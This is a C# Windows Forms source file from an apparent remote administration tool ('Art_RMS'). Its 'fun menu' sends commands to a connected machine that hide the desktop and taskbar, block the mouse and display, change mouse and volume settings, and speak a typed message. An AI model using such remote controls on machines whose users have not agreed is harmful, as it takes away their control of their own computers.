using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Art_RMS.Forms
{
    public partial class Set_Speed_Cursor : Form
    {
        Listener server = new Listener();
        public Set_Speed_Cursor()
        {
            InitializeComponent();
        }

        private void Hide_Click(object sender, EventArgs e)
        {
            string query = "HIDE_ELEMENT_FROM_FUN_MENU|";
            switch ((sender as Button).Text)
            {
                case "Hide Desktop":
                    query += "Progman|";
                    break;
                case "Hide Taskbar":
                    query += "Shell_TrayWnd|";
                    break;
                case "Hide Start Btn":
                    query += "Shell_TrayWnd|Start";
                    break;
                case "Hide Task Icons":
                    query += "Shell_TrayWnd|ReBarWindow32";
                    break;
                case "Hide Tray":
                    query += "Shell_TrayWnd|TrayNotifyWnd";
                    break;
            }
            server.Send(Convert.ToInt32(this.Tag), query);
        }

        private void Show_Click(object sender, EventArgs e)
        {
            string query = "SHOW_ELEMENT_FROM_FUN_MENU|";
            switch ((sender as Button).Text)
            {
                case "Show Desktop":
                    query += "Progman|";
                    break;
                case "Show Taskbar":
                    query += "Shell_TrayWnd|";
                    break;
                case "Show Start Btn":
                    query += "Shell_TrayWnd|Start";
                    break;
                case "Show Task Icons":
                    query += "Shell_TrayWnd|ReBarWindow32";
                    break;
                case "Show Tray":
                    query += "Shell_TrayWnd|TrayNotifyWnd";
                    break;
            }
            server.Send(Convert.ToInt32(this.Tag), query);
        }

        private void Block_Unlock_Click(object sender, EventArgs e)
        {
            switch ((sender as Button).Text)
            {
                case "Block Mouse":
                    server.Send(Convert.ToInt32(this.Tag), "BLOCK_MOUSE|");
                    break;
                case "Unlock Mouse":
                    server.Send(Convert.ToInt32(this.Tag), "UNLOCK_MOUSE|");
                    break;
                case "Block Display":
                    server.Send(Convert.ToInt32(this.Tag), "BLOCK_DISPLAY|");
                    break;
                case "Unlock Display":
                    server.Send(Convert.ToInt32(this.Tag), "UNLOCK_DISPLAY|");
                    break;
            }
        }

        private void Set_Mouse_Click(object sender, EventArgs e)
        {
            switch ((sender as Button).Name)
            {
                case "Set_Speed_Cursor_btn":
                    server.Send(Convert.ToInt32(this.Tag), "CHANGE_PARAMETERS_MOUSE|CHANGE_SPEED_MOUSE|" + Speed_Mouse.Value);
                    break;
                case "Set_Speed_DBL_Click":
                    server.Send(Convert.ToInt32(this.Tag), "CHANGE_PARAMETERS_MOUSE|CHANGE_SPEED_DOUBLE_CLICK_MOUSE|" + Speed_DBL_Click.Value);
                    break;
                case "Set_Mouse_Track":
                    server.Send(Convert.ToInt32(this.Tag), "CHANGE_PARAMETERS_MOUSE|CHANGE_MOUSE_TRACK|" + Mouse_Track.Value);
                    break;
                case "Set_Scroll_Mouse":
                    server.Send(Convert.ToInt32(this.Tag), "CHANGE_PARAMETERS_MOUSE|CHANGE_SPEED_SCROLL_MOUSE|" + Scroll_Mouse.Value);
                    break;
                case "Set_volume_btn":
                    server.Send(Convert.ToInt32(this.Tag), "SET_VOLUME|" + Volume_Track.Value);
                    break;
                case "Sound_message":
                    server.Send(Convert.ToInt32(this.Tag), "READ_MESSAGE|" + Message_text.Text);
                    Message_text.Clear();
                    break;
            }
        }
    }
}
